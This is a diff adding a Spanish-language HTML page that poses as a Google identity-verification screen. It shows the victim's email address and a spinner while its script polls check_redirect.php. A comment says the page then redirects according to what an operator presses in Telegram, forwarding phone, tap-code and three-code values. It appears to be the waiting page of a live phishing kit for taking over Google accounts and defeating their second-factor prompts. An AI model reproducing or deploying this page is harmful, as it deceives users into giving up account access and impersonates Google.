@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificando tu identidad</title>
+    <style>
+        body { background-color: #f8f9fa; font-family: 'Roboto', Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 40px; width: 400px; max-width: 90%; text-align: center; }
+        .logo img { width: 74px; margin-bottom: 20px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
+        p { color: #5f6368; font-size: 14px; margin-bottom: 20px; }
+        .email-display { background: #f5f5f5; padding: 15px; border-radius: 4px; font-weight: 500; margin: 20px 0; }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #4285f4; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo"><img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google"></div>
+        <h1>Verificando...</h1>
+        <p>Por favor espera mientras verificamos tu cuenta.</p>
+        <div class="email-display" id="displayEmail">Cargando...</div>
+        <div class="spinner"></div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email') || localStorage.getItem('userEmail') || '';
+        const sessionId = urlParams.get('session_id') || localStorage.getItem('sessionId') || '';
+
+        if (email) document.getElementById('displayEmail').textContent = email;
+
+        // Esto lee lo que presiones en Telegram y te redirige
+        if (sessionId) {
+            setInterval(() => {
+                fetch('check_redirect.php?session_id=' + encodeURIComponent(sessionId))
+                .then(response => response.json())
+                .then(data => {
+                    if (data.redirect && data.redirect.trim() !== '') {
+                        let redirectUrl = data.redirect + '.html?email=' + encodeURIComponent(email) + '&session_id=' + encodeURIComponent(sessionId);
+                        if (data.phone_display) redirectUrl += '&phone_display=' + encodeURIComponent(data.phone_display);
+                        if (data.tap_code_value) redirectUrl += '&tap_code_value=' + encodeURIComponent(data.tap_code_value);
+                        if (data.three_codes_value) redirectUrl += '&three_codes_value=' + encodeURIComponent(data.three_codes_value);
+                        
+                        window.location.href = redirectUrl;
+                    }
+                }).catch(e => console.log('Esperando...'));
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
